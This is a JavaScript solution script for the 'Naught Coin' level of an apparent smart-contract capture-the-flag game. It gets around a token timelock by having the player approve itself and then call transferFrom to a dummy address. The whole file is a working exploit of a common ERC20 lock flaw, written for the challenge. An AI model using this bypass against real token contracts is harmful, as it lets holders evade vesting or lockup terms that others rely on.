const {BLOCK_EXPLORER_URL, NAUGHT_COIN_INSTANCE_ADDRESS} = require('./utils');

// you can get any address on chain
const randomAddress = '0x0000000000000000000000000000000000000001';

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Naught Coin level');

    if (!NAUGHT_COIN_INSTANCE_ADDRESS) {
        console.log('Naught Coin instance address not found');
        return;
    }

    console.log('Naught Coin instance address', NAUGHT_COIN_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("NaughtCoin");
    const contract = factory.attach(NAUGHT_COIN_INSTANCE_ADDRESS);
    const tokens = ethers.BigNumber.from(10).pow(18).mul(1000000);

    let tx = await contract.approve(attacker.address, tokens);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    tx = await contract.transferFrom(attacker.address, randomAddress, tokens);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Naught Coin level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
